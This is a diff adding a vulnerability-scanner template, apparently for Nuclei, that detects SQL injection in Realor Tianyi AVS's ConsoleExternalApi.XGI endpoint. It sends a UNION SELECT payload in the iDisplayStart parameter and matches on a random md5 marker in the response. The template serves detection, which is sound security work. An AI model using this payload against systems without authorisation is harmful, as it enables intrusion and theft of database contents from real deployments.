@@ -1,0 +1,33 @@
+id: realor-tianyi-sqli
+
+info:
+  name: Realor Tianyi AVS ConsoleExternalApi.XGI SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Realor Tianyi Application Virtualization System is vulnerable to SQL injection, allowing attackers to retrieve sensitive database information or execute arbitrary commands.
+  reference:
+    - http://www.realor.cn/product/tianyi/
+  classification:
+    cvss-score: 9.2
+    cve-id: ""
+
+variables:
+  random_string: '{{rand_int(100000, 999999)}}'
+  random_string_md5: '{{md5(random_string)}}'
+
+http:
+  - raw:
+      - |
+        GET /ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,md5({{random_string}})%23 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{random_string_md5}}"
+        part: body
+      - type: status
+        status:
+          - 200
